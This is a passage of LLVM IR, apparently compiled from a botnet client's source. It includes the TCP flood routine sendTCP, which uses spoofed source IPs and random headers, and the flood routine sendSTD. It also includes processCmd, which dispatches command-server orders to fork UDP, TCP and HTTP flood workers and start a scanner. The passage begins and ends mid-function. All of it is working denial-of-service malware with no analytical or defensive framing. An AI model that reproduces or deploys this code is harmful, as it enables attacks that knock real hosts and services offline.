  %191 = call i32 @usleep(i32 %148) #6
  br label %.outer72.backedge

.outer72.backedge:                                ; preds = %190, %192
  %.0.ph.be = phi i32 [ 0, %190 ], [ %193, %192 ]
  br label %.outer72

; <label>:192:                                    ; preds = %.us-lcssa79
  %193 = add i32 %.0.ph, 1
  br label %.outer72.backedge

.us-lcssa80.us.loopexit:                          ; preds = %167
  br label %.us-lcssa80.us

.us-lcssa80.us.loopexit106:                       ; preds = %185
  br label %.us-lcssa80.us

.us-lcssa80.us:                                   ; preds = %.us-lcssa80.us.loopexit106, %.us-lcssa80.us.loopexit
  call void @llvm.stackrestore(i8* %100)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %54
  br label %.loopexit

.loopexit.loopexit105:                            ; preds = %64
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit105, %.loopexit.loopexit, %19, %34, %.us-lcssa80.us, %83, %76, %31
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #5

declare i32 @usleep(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #15
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %165

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #6
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @KadenCommStock, align 4
  %30 = tail call i32 (i32, i8*, ...) @botnetPrint(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i64 0, i64 0))
  br label %165

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #6
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @KadenCommStock, align 4
  %37 = call i32 (i32, i8*, ...) @botnetPrint(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.107, i64 0, i64 0))
  br label %165

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @GRIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #15
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i64 0, i64 0)) #14
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i64 0, i64 0)) #6
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.110, i64 0, i64 0)) #14
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.111, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i64 0, i64 0)) #6
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i64 0, i64 0)) #14
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.113, i64 0, i64 0)) #14
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.114, i64 0, i64 0)) #14
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @KadenCommStock, align 4
  %108 = call i32 (i32, i8*, ...) @botnetPrint(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.115, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #15
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i64 @time(i64* null) #6
  %138 = zext i32 %2 to i64
  %139 = add i64 %137, %138
  %140 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %141 = getelementptr inbounds i8, i8* %45, i64 12
  %142 = bitcast i8* %141 to i32*
  %143 = getelementptr inbounds i8, i8* %45, i64 4
  %144 = bitcast i8* %143 to i16*
  %sext = shl i64 %139, 32
  %145 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %146 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %140, i32 16) #6
  %147 = call i32 @GRIP(i32 %.065)
  %148 = call i32 @htonl(i32 %147) #15
  store i32 %148, i32* %142, align 4
  %149 = call i32 @rand_cmwc()
  %150 = trunc i32 %149 to i16
  store i16 %150, i16* %144, align 4
  %151 = call i32 @rand_cmwc()
  store i32 %151, i32* %59, align 8
  %152 = call i32 @rand_cmwc()
  %153 = trunc i32 %152 to i16
  store i16 %153, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %154 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %154, i16* %114, align 4
  %155 = load i16, i16* %131, align 2
  %156 = zext i16 %155 to i32
  %157 = call zeroext i16 @csum(i16* nonnull %129, i32 %156)
  store i16 %157, i16* %136, align 2
  %158 = icmp eq i32 %.0, %6
  br i1 %158, label %159, label %162

; <label>:159:                                    ; preds = %.backedge
  %160 = call i64 @time(i64* null) #6
  %161 = icmp sgt i64 %160, %145
  br i1 %161, label %164, label %.backedge.backedge

; <label>:162:                                    ; preds = %.backedge
  %163 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %162, %159
  %.0.be = phi i32 [ %163, %162 ], [ 0, %159 ]
  br label %.backedge

; <label>:164:                                    ; preds = %159
  call void @llvm.stackrestore(i8* %44)
  br label %165

; <label>:165:                                    ; preds = %18, %164, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #8

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #2

; Function Attrs: noinline noreturn nounwind uwtable
define void @sendSTD(i8*, i32, i32) local_unnamed_addr #11 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #6
  %6 = tail call i64 @time(i64* null) #6
  %7 = tail call %struct.hostent* @gethostbyname(i8* %0) #6
  %8 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %8, i8 0, i64 16, i32 4, i1 false)
  %9 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 4
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 3
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %16) #6
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 2
  %18 = load i32, i32* %17, align 8
  %19 = trunc i32 %18 to i16
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %19, i16* %20, align 4
  %21 = trunc i32 %1 to i16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %24 = sext i32 %2 to i64
  %25 = add nsw i64 %6, %24
  br label %26

; <label>:26:                                     ; preds = %40, %3
  %.0 = phi i32 [ 0, %3 ], [ %41, %40 ]
  %27 = call i32 @rand() #6
  %28 = icmp ugt i32 %.0, 49
  br i1 %28, label %29, label %40

; <label>:29:                                     ; preds = %26
  %30 = sext i32 %27 to i64
  %31 = urem i64 %30, 36
  %32 = getelementptr inbounds [36 x i8*], [36 x i8*]* @sendSTD.randstrings, i64 0, i64 %31
  %33 = load i8*, i8** %32, align 8
  %34 = call i64 @send(i32 %5, i8* %33, i64 69, i32 0) #6
  %35 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %23, i32 16) #6
  %36 = call i64 @time(i64* null) #6
  %37 = icmp slt i64 %36, %25
  br i1 %37, label %40, label %38

; <label>:38:                                     ; preds = %29
  %39 = call i32 @close(i32 %5) #6
  call void @_exit(i32 0) #16
  unreachable

; <label>:40:                                     ; preds = %29, %26
  %.1 = phi i32 [ %.0, %26 ], [ 0, %29 ]
  %41 = add i32 %.1, 1
  br label %26
}

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.152, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %28

; <label>:6:                                      ; preds = %2
  %7 = getelementptr inbounds i8*, i8** %1, i64 1
  %8 = load i8*, i8** %7, align 8
  %9 = tail call i32 @strcmp(i8* %8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.153, i64 0, i64 0)) #14
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %11, label %16

; <label>:11:                                     ; preds = %6
  %12 = load i32, i32* @botnetPid, align 4
  %13 = icmp eq i32 %12, 0
  br i1 %13, label %.loopexit, label %14

; <label>:14:                                     ; preds = %11
  %15 = tail call i32 @kill(i32 %12, i32 9) #6
  store i32 0, i32* @botnetPid, align 4
  %.pre = load i8*, i8** %7, align 8
  br label %16

; <label>:16:                                     ; preds = %6, %14
  %17 = phi i8* [ %8, %6 ], [ %.pre, %14 ]
  %18 = tail call i32 @strcmp(i8* %17, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.154, i64 0, i64 0)) #14
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %._crit_edge

._crit_edge:                                      ; preds = %16
  %.pre155 = load i8*, i8** %1, align 8
  br label %28

; <label>:20:                                     ; preds = %16
  %21 = load i32, i32* @botnetPid, align 4
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %.loopexit

; <label>:23:                                     ; preds = %20
  %24 = tail call i32 @fork() #6
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %27, label %26

; <label>:26:                                     ; preds = %23
  store i32 %24, i32* @botnetPid, align 4
  br label %.loopexit

; <label>:27:                                     ; preds = %23
  tail call void @botnetTScan(i32 10, i32 1000)
  unreachable

; <label>:28:                                     ; preds = %._crit_edge, %2
  %29 = phi i8* [ %.pre155, %._crit_edge ], [ %3, %2 ]
  %30 = tail call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.155, i64 0, i64 0)) #14
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %99

; <label>:32:                                     ; preds = %28
  %33 = icmp slt i32 %0, 6
  br i1 %33, label %.loopexit, label %34

; <label>:34:                                     ; preds = %32
  %35 = getelementptr inbounds i8*, i8** %1, i64 3
  %36 = load i8*, i8** %35, align 8
  %37 = tail call i32 @atoi(i8* %36) #14
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %.loopexit, label %39

; <label>:39:                                     ; preds = %34
  %40 = getelementptr inbounds i8*, i8** %1, i64 2
  %41 = load i8*, i8** %40, align 8
  %42 = tail call i32 @atoi(i8* %41) #14
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %.loopexit, label %44

; <label>:44:                                     ; preds = %39
  %45 = getelementptr inbounds i8*, i8** %1, i64 4
  %46 = load i8*, i8** %45, align 8
  %47 = tail call i32 @atoi(i8* %46) #14
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %.loopexit, label %49

; <label>:49:                                     ; preds = %44
  %50 = getelementptr inbounds i8*, i8** %1, i64 5
  %51 = load i8*, i8** %50, align 8
  %52 = tail call i32 @atoi(i8* %51) #14
  %53 = icmp eq i32 %52, -1
  %54 = icmp sgt i32 %52, 65500
  %55 = or i1 %54, %53
  %56 = icmp sgt i32 %47, 32
  %or.cond133 = or i1 %56, %55
  br i1 %or.cond133, label %.loopexit, label %57

; <label>:57:                                     ; preds = %49
  %58 = icmp eq i32 %0, 7
  br i1 %58, label %59, label %64

; <label>:59:                                     ; preds = %57
  %60 = getelementptr inbounds i8*, i8** %1, i64 6
  %61 = load i8*, i8** %60, align 8
  %62 = tail call i32 @atoi(i8* %61) #14
  %63 = icmp slt i32 %62, 1
  br i1 %63, label %.loopexit, label %64

; <label>:64:                                     ; preds = %59, %57
  %65 = getelementptr inbounds i8*, i8** %1, i64 1
  %66 = load i8*, i8** %65, align 8
  %67 = tail call i32 @atoi(i8* %41) #14
  %68 = tail call i32 @atoi(i8* %36) #14
  %69 = tail call i32 @atoi(i8* %46) #14
  %70 = tail call i32 @atoi(i8* %51) #14
  %71 = icmp sgt i32 %0, 6
  br i1 %71, label %72, label %.thread137

; <label>:72:                                     ; preds = %64
  %73 = getelementptr inbounds i8*, i8** %1, i64 6
  %74 = load i8*, i8** %73, align 8
  %75 = tail call i32 @atoi(i8* %74) #14
  br i1 %58, label %.thread137, label %76

; <label>:76:                                     ; preds = %72
  %77 = getelementptr inbounds i8*, i8** %1, i64 7
  %78 = load i8*, i8** %77, align 8
  %79 = tail call i32 @atoi(i8* %78) #14
  %80 = icmp sgt i32 %0, 8
  br i1 %80, label %81, label %.thread137

; <label>:81:                                     ; preds = %76
  %82 = getelementptr inbounds i8*, i8** %1, i64 8
  %83 = load i8*, i8** %82, align 8
  %84 = tail call i32 @atoi(i8* %83) #14
  br label %.thread137

.thread137:                                       ; preds = %72, %64, %76, %81
  %85 = phi i32 [ %79, %81 ], [ %79, %76 ], [ 1000000, %72 ], [ 1000000, %64 ]
  %86 = phi i32 [ %75, %81 ], [ %75, %76 ], [ %75, %72 ], [ 1000, %64 ]
  %87 = phi i32 [ %84, %81 ], [ 0, %76 ], [ 0, %72 ], [ 0, %64 ]
  %strchr = tail call i8* @strchr(i8* %66, i32 44)
  %88 = icmp eq i8* %strchr, null
  br i1 %88, label %95, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.thread137
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %91
  %.sink = phi i8* [ null, %91 ], [ %66, %.preheader.preheader ]
  %89 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i64 0, i64 0)) #6
  %90 = icmp eq i8* %89, null
  br i1 %90, label %.loopexit.loopexit, label %91

; <label>:91:                                     ; preds = %.preheader
  %92 = tail call i32 @listFork()
  %93 = icmp eq i32 %92, 0
  br i1 %93, label %94, label %.preheader

; <label>:94:                                     ; preds = %91
  tail call void @sendUDP(i8* nonnull %89, i32 %67, i32 %68, i32 %69, i32 %70, i32 %86, i32 %85, i32 %87)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:95:                                     ; preds = %.thread137
  %96 = tail call i32 @listFork()
  %97 = icmp eq i32 %96, 0
  br i1 %97, label %98, label %.loopexit

; <label>:98:                                     ; preds = %95
  tail call void @sendUDP(i8* %66, i32 %67, i32 %68, i32 %69, i32 %70, i32 %86, i32 %85, i32 %87)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:99:                                     ; preds = %28
  %100 = tail call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.156, i64 0, i64 0)) #14
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %.loopexit144

; <label>:102:                                    ; preds = %99
  %103 = icmp slt i32 %0, 6
  br i1 %103, label %.loopexit, label %104

; <label>:104:                                    ; preds = %102
  %105 = getelementptr inbounds i8*, i8** %1, i64 3
  %106 = load i8*, i8** %105, align 8
  %107 = tail call i32 @atoi(i8* %106) #14
  %108 = icmp eq i32 %107, -1
  br i1 %108, label %.loopexit, label %109

; <label>:109:                                    ; preds = %104
  %110 = getelementptr inbounds i8*, i8** %1, i64 2
  %111 = load i8*, i8** %110, align 8
  %112 = tail call i32 @atoi(i8* %111) #14
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %.loopexit, label %114

; <label>:114:                                    ; preds = %109
  %115 = getelementptr inbounds i8*, i8** %1, i64 4
  %116 = load i8*, i8** %115, align 8
  %117 = tail call i32 @atoi(i8* %116) #14
  %118 = icmp eq i32 %117, -1
  %119 = icmp sgt i32 %117, 32
  %or.cond134 = or i1 %118, %119
  br i1 %or.cond134, label %.loopexit, label %120

; <label>:120:                                    ; preds = %114
  %121 = icmp sgt i32 %0, 6
  br i1 %121, label %122, label %.thread138

; <label>:122:                                    ; preds = %120
  %123 = getelementptr inbounds i8*, i8** %1, i64 6
  %124 = load i8*, i8** %123, align 8
  %125 = tail call i32 @atoi(i8* %124) #14
  %126 = icmp slt i32 %125, 0
  br i1 %126, label %.loopexit, label %127

; <label>:127:                                    ; preds = %122
  %128 = icmp eq i32 %0, 8
  br i1 %128, label %129, label %.thread138

; <label>:129:                                    ; preds = %127
  %130 = getelementptr inbounds i8*, i8** %1, i64 7
  %131 = load i8*, i8** %130, align 8
  %132 = tail call i32 @atoi(i8* %131) #14
  %133 = icmp slt i32 %132, 1
  br i1 %133, label %.loopexit, label %.thread138

.thread138:                                       ; preds = %120, %129, %127
  %134 = phi i1 [ true, %129 ], [ false, %127 ], [ false, %120 ]
  %135 = getelementptr inbounds i8*, i8** %1, i64 1
  %136 = load i8*, i8** %135, align 8
  %137 = tail call i32 @atoi(i8* %111) #14
  %138 = tail call i32 @atoi(i8* %106) #14
  %139 = tail call i32 @atoi(i8* %116) #14
  %140 = getelementptr inbounds i8*, i8** %1, i64 5
  %141 = load i8*, i8** %140, align 8
  br i1 %134, label %142, label %146

; <label>:142:                                    ; preds = %.thread138
  %143 = getelementptr inbounds i8*, i8** %1, i64 7
  %144 = load i8*, i8** %143, align 8
  %145 = tail call i32 @atoi(i8* %144) #14
  br label %146

; <label>:146:                                    ; preds = %.thread138, %142
  %147 = phi i32 [ %145, %142 ], [ 10, %.thread138 ]
  br i1 %121, label %148, label %152

; <label>:148:                                    ; preds = %146
  %149 = getelementptr inbounds i8*, i8** %1, i64 6
  %150 = load i8*, i8** %149, align 8
  %151 = tail call i32 @atoi(i8* %150) #14
  br label %152

; <label>:152:                                    ; preds = %146, %148
  %153 = phi i32 [ %151, %148 ], [ 0, %146 ]
  %strchr130 = tail call i8* @strchr(i8* %136, i32 44)
  %154 = icmp eq i8* %strchr130, null
  br i1 %154, label %161, label %.preheader143.preheader

.preheader143.preheader:                          ; preds = %152
  br label %.preheader143

.preheader143:                                    ; preds = %.preheader143.preheader, %157
  %.sink135 = phi i8* [ null, %157 ], [ %136, %.preheader143.preheader ]
  %155 = tail call i8* @strtok(i8* %.sink135, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i64 0, i64 0)) #6
  %156 = icmp eq i8* %155, null
  br i1 %156, label %.loopexit144.loopexit, label %157

; <label>:157:                                    ; preds = %.preheader143
  %158 = tail call i32 @listFork()
  %159 = icmp eq i32 %158, 0
  br i1 %159, label %160, label %.preheader143

; <label>:160:                                    ; preds = %157
  tail call void @sendTCP(i8* nonnull %155, i32 %137, i32 %138, i32 %139, i8* %141, i32 %153, i32 %147)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:161:                                    ; preds = %152
  %162 = tail call i32 @listFork()
  %163 = icmp eq i32 %162, 0
  br i1 %163, label %164, label %.loopexit144

; <label>:164:                                    ; preds = %161
  tail call void @sendTCP(i8* %136, i32 %137, i32 %138, i32 %139, i8* %141, i32 %153, i32 %147)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit144.loopexit:                            ; preds = %.preheader143
  br label %.loopexit144

.loopexit144:                                     ; preds = %.loopexit144.loopexit, %161, %99
  %165 = load i8*, i8** %1, align 8
  %166 = tail call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.157, i64 0, i64 0)) #14
  %167 = icmp eq i32 %166, 0
  br i1 %167, label %168, label %198

; <label>:168:                                    ; preds = %.loopexit144
  %169 = icmp slt i32 %0, 6
  br i1 %169, label %.loopexit, label %170

; <label>:170:                                    ; preds = %168
  %171 = getelementptr inbounds i8*, i8** %1, i64 3
  %172 = load i8*, i8** %171, align 8
  %173 = tail call i32 @atoi(i8* %172) #14
  %174 = icmp slt i32 %173, 1
  br i1 %174, label %.loopexit, label %175

; <label>:175:                                    ; preds = %170
  %176 = getelementptr inbounds i8*, i8** %1, i64 5
  %177 = load i8*, i8** %176, align 8
  %178 = tail call i32 @atoi(i8* %177) #14
  %179 = icmp slt i32 %178, 1
  br i1 %179, label %.loopexit, label %180

; <label>:180:                                    ; preds = %175
  %181 = tail call i32 @listFork()
  %182 = icmp eq i32 %181, 0
  br i1 %182, label %183, label %.loopexit

; <label>:183:                                    ; preds = %180
  %184 = getelementptr inbounds i8*, i8** %1, i64 1
  %185 = load i8*, i8** %184, align 8
  %186 = getelementptr inbounds i8*, i8** %1, i64 2
  %187 = load i8*, i8** %186, align 8
  %188 = load i8*, i8** %171, align 8
  %189 = tail call i32 @atoi(i8* %188) #14
  %190 = trunc i32 %189 to i16
  %191 = getelementptr inbounds i8*, i8** %1, i64 4
  %192 = load i8*, i8** %191, align 8
  %193 = load i8*, i8** %176, align 8
  %194 = tail call i32 @atoi(i8* %193) #14
  %195 = getelementptr inbounds i8*, i8** %1, i64 6
  %196 = load i8*, i8** %195, align 8
  %197 = tail call i32 @atoi(i8* %196) #14
  tail call void @SendHTTP(i8* %185, i8* %187, i16 zeroext %190, i8* %192, i32 %194, i32 %197)
  tail call void @exit(i32 0) #16
  unreachable

; <label>:198:                                    ; preds = %.loopexit144
  %199 = tail call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.158, i64 0, i64 0)) #14
  %200 = icmp eq i32 %199, 0
  br i1 %200, label %201, label %229

; <label>:201:                                    ; preds = %198
  %202 = icmp slt i32 %0, 6
  br i1 %202, label %.loopexit, label %203

; <label>:203:                                    ; preds = %201
  %204 = getelementptr inbounds i8*, i8** %1, i64 3
  %205 = load i8*, i8** %204, align 8
  %206 = tail call i32 @atoi(i8* %205) #14
  %207 = icmp slt i32 %206, 1
  br i1 %207, label %.loopexit, label %208

; <label>:208:                                    ; preds = %203
  %209 = getelementptr inbounds i8*, i8** %1, i64 5
  %210 = load i8*, i8** %209, align 8
  %211 = tail call i32 @atoi(i8* %210) #14
  %212 = icmp slt i32 %211, 1
  br i1 %212, label %.loopexit, label %213

; <label>:213:                                    ; preds = %208
  %214 = tail call i32 @listFork()
  %215 = icmp eq i32 %214, 0
  br i1 %215, label %216, label %.loopexit

; <label>:216:                                    ; preds = %213
  %217 = getelementptr inbounds i8*, i8** %1, i64 1
  %218 = load i8*, i8** %217, align 8
  %219 = getelementptr inbounds i8*, i8** %1, i64 2
  %220 = load i8*, i8** %219, align 8
  %221 = load i8*, i8** %204, align 8
